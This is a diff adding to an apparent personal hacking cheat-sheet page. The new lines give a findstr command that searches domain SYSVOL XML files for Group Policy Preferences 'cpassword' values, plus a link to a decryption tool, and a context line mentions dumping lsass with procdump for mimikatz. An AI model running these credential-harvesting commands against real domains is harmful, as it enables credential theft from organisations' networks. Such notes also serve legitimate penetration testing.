@@ -84,3 +84,9 @@ usefull tips and tools for hacking
   <li> procdump lsass https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php
   <li>
 </ul>
+
+<b>cpassword</b>
+<ul>
+  <li> findstr -S cpassword $env:logonserver\sysvol\*.xml
+  <li> crack passwords with https://github.com/t0thkr1s/gpp-decrypt
+</ul>
